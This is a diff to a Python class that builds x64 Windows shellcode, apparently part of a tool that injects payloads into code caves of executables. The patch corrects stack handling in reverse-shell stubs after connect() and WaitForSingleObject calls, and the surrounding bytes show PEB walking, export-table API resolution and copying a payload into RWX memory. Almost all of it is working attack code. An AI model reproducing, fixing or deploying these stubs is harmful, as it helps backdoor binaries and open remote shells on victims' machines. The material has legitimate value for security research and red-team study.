@@ -71,6 +71,7 @@ class winI64_shellcode():
 
     def clean_caves_stub(self, CavesToFix):
         stub = ("\x48\x31\xC0"                          # xor rax,rax
+                "\x48\x31\xC9"                          # xor rcx,rcx
                 "\x65\x48\x8B\x49\x60"                  # mov rcx,QWORD PTR gs:[rcx+0x60]
                 "\x48\x8B\x49\x10"                      # mov rcx,QWORD PTR [rcx+0x10]
                 "\x48\x89\xCB"                          # mov rbx,rcx
@@ -1046,6 +1047,7 @@ class winI64_shellcode():
                             "\x4C\x89\xE1"                                   # mov rcx, r12
                             "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                             "\xFF\xD3"                                       # call rbx ;connect (s, &sockaddr, 16)
+                            "\x48\x81\xC4\xb8\x02\x00\x00"                   # add rsp, 0x2b8
                             )
         #socket is in r12
 
@@ -1131,7 +1133,7 @@ class winI64_shellcode():
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\xFF\xD0"                                       # call rax; WaitForSingleObject( pi.hProcess, INFINITE );
                            #Fix Up rsp
-                           "\x48\x81\xC4\x08\x04\x00\x00"                   # add rsp, 490
+                           "\x48\x81\xC4\x50\x01\x00\x00"                   # add rsp, 0x150 
                            )
         self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
         return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)
@@ -1295,6 +1297,8 @@ class winI64_shellcode():
                             "\x4C\x89\xE1"                                   # mov rcx, r12
                             "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                             "\xFF\xD3"                                       # call rbx ;connect (s, &sockaddr, 16)
+                            "\x48\x81\xC4\xb8\x02\x00\x00"                   # add rsp, 0x2b8
+
                             )
         #socket is in r12
 
@@ -1365,7 +1369,7 @@ class winI64_shellcode():
                             "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                             "\xFF\xD0"                                       # call rax; WaitForSingleObject( pi.hProcess, INFINITE );
                             #Fix Up rsp
-                            #"\x48\x81\xC4\x08\x04\x00\x00"                   # add rsp, 490
+                            #"\x48\x81\xC4\x08\x04\x00\x00"                   # add rsp, 0x408
                             )
                             # ADD EXITFUNC HERE THREAD
         #kernel32 handle in r13
@@ -1436,7 +1440,7 @@ class winI64_shellcode():
                            "\xe2\xed"                          # loop until read, back to xor rax, rax
                            "\x52"                              # push rdx ; Save the current position in the module list for later
                            "\x41\x51"                          # push r9 ; Save the current module hash for later
-                                                               # ; Proceed to itterate the export address table,
+                                                               # ; Proceed to iterate the export address table,
                            "\x48\x8b\x52\x20"                  # mov rdx, [rdx+32] ; Get this modules base address
                            "\x8b\x42\x3c"                      # mov eax, dword [rdx+60] ; Get PE header
                            "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
@@ -1537,7 +1541,7 @@ class winI64_shellcode():
             self.shellcode1 += "\xeb\x43"
 
                             # got_payload:
-        self.shellcode1 += ("\x5e"                                 # pop rsi            ; Prepare ESI with the source to copy
+        self.shellcode1 += ("\x5e"                                  # pop rsi            ; Prepare ESI with the source to copy
                             "\xf2\xa4"                              # rep movsb          ; Copy the payload to RWX memory
                             "\xe8\x00\x00\x00\x00"                  # call set_handler   ; Configure error handling
 
